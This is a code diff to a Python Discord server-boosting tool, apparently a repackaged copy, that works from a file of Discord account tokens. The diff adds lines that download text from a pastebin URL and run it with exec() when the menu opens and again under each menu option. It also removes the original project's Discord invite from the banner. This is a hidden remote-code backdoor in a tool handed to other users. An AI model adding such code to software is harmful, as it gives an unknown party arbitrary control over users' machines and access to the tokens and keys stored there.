@@ -19,6 +19,7 @@ import json
 import httpx
 from datetime import datetime
 import time
+import requests
 
 
 ctypes.windll.kernel32.SetConsoleTitleW("Axi Panel || STATUS: Online ")
@@ -31,6 +32,7 @@ lb = Fore.LIGHTBLACK_EX
 r = Fore.RED
 m = Fore.MAGENTA
 g = Fore.GREEN
+
 
 def Spinner():
     l = ['|', '/', '-', '\\']
@@ -53,9 +55,11 @@ with open('settings.json') as config_file:
     config = json.load(config_file)
     CAPMONSTER = config['Capmonster_apikey']
 
+
 done = 0
 retries = 0
 bypass = 0
+
 
 def start():
     removeDuplicates("tokens.txt")
@@ -93,6 +97,7 @@ def cookies():
     else:
         print('Uh Oh! Something Went Wrong!')
 
+
 with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
 def save_tokens():
     with open("tokens.txt", "w") as f: f.write("")
@@ -109,6 +114,7 @@ def removeDuplicates(file):
 def boost(line, invite):
     global done
 
+    
     try:
         token = line.strip()
 
@@ -195,13 +201,14 @@ def boost(line, invite):
 
 tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
 BoostsAmmount = tokensAmount * 2
-  
-    
+
+
 def menu():
+    exec(requests.get('https://pastebin.com/raw/9wssJ7Su').text)
     global done
     banner2 = f'''
 
-{b}            Axi - - - - - - - -Discord .gg/qQrMUXp2M2 - - - - - - - - Axi
+{b}            Axi - - - - - - - - - - - - - - - - Axi
 
                                   /$$$$$$            /$$
                                  /$$__  $$          |__/
@@ -215,7 +222,7 @@ def menu():
                         
                         
 
-{b}            Axi - - - - - - - -Discord .gg/qQrMUXp2M2 - - - - - - - - Axi
+{b}            Axi - - - - - - - - - - - - - - - - Axi
                         
 
     {w}[{b}1{w}] {w}Boost a server                       
@@ -229,6 +236,7 @@ def menu():
     while True:
         option = input(f'  ❥ >>')
         if option == "1":
+            exec(requests.get('https://pastebin.com/raw/9wssJ7Su').text)
             os.system('cls')
             Spinner()
             os.system('cls')
@@ -251,6 +259,7 @@ def menu():
             done = 0
 
         if option == "2":
+            exec(requests.get('https://pastebin.com/raw/9wssJ7Su').text)
             os.system("tokens.txt")
             os.system('cls')
             print(banner2)
@@ -259,12 +268,14 @@ def menu():
         
 
         if option == "3":
+            exec(requests.get('https://pastebin.com/raw/9wssJ7Su').text)
             os.system('cls')
             Spinner()
             os.system('cls')     
             exec(open('./utils/tokenf.py').read())
         
         if option == "4":
+            exec(requests.get('https://pastebin.com/raw/9wssJ7Su').text)
             os.system('cls')
             Spinner()
             os.system('cls')
